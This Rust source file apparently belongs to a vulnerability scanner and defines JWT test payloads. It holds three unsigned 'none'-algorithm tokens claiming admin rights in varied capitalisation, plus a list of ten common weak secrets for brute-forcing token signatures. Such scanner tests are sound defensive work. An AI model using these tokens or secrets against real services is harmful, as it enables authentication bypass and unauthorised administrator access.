use crate::domain::active_vuln::{PayloadDefinition, ExpectedIndicator};
use crate::domain::entities::SeverityLevel;

pub fn get_none_alg_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "jwt_none_01".into(),
            payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.".into(),
            description: "JWT with 'none' algorithm — admin claim".into(),
            expected_indicator: ExpectedIndicator::JwtAccepted,
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "jwt_none_02".into(),
            payload: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.".into(),
            description: "JWT with 'None' (capitalized) algorithm bypass".into(),
            expected_indicator: ExpectedIndicator::JwtAccepted,
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "jwt_none_03".into(),
            payload: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.".into(),
            description: "JWT with 'NONE' (uppercase) algorithm bypass".into(),
            expected_indicator: ExpectedIndicator::JwtAccepted,
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}

pub fn get_weak_secret_payloads() -> Vec<PayloadDefinition> {
    // Common weak JWT secrets to test
    let weak_secrets = vec![
        "secret", "password", "123456", "key", "jwt_secret",
        "changeme", "test", "admin", "default", "mysecret",
    ];

    weak_secrets.iter().enumerate().map(|(i, secret)| {
        PayloadDefinition {
            id: format!("jwt_weak_{:02}", i + 1),
            payload: secret.to_string(),
            description: format!("Weak JWT secret brute-force: '{}'", secret),
            expected_indicator: ExpectedIndicator::JwtAccepted,
            severity: SeverityLevel::High,
            safe_for_production: true,
        }
    }).collect()
}
